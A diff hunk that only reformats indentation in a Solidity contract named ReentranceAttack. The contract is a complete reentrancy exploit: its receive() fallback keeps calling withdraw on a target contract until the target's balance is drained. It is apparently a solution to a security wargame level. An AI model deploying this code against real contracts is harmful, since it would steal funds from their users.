@@ -8,17 +8,17 @@ contract ReentranceAttack {
     uint256 public userAmount;
 
     constructor(address reentranceAddress) public {
-	instance = Reentrance(payable(reentranceAddress));
+        instance = Reentrance(payable(reentranceAddress));
     }
 
     function attack(uint256 amount) public {
-	userAmount = amount;
-	instance.withdraw(amount);
+        userAmount = amount;
+        instance.withdraw(amount);
     }
 
     receive() external payable {
-	if (address(instance).balance > 0) {
-	    instance.withdraw(userAmount);
-	}
+        if (address(instance).balance > 0) {
+            instance.withdraw(userAmount);
+        }
     }
 }
